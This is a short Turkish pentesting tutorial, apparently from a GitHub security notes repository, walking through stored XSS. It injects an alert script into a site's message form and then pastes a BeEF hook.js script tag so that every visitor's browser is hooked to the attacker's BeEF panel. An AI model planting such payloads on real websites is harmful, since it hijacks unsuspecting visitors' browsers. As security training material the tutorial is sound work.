## XXS Stored
#### Bu sefer form siteleri benzeri bir etkileşim yeri buluyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/41454e2cfb3fb9afae9f262e08f50311f927397e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.03.03.jpeg)
#### Rastgele bir isim giriyoruz, mesaj kısmına ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/9991c76b35828899d62e508174455d796dc28ba0/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.05.40.jpeg)
#### Mesajımızı siteye giren herkes göreceği için bu sayfaya giren herkesin ekranında ```ı hack you``` mesajı görülecek
![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)

## XSS Stored ve Beef Çalıştırma
#### ```beef-xss``` ile beef'i açıyoruz
#### ```example``` kısmınıdaki ```<script src="http://.../hook.js"></script>```kodunu kopyalıyoruz ve sitemize geri dönüyoruz
#### Bu kodu mesaj kısımına yapıştırıp submit ediyoruz
#### Artık bu siteye giren herkes hook'umuza takılmış olucak ve ```beef``` üzerinden bize görünür olucak
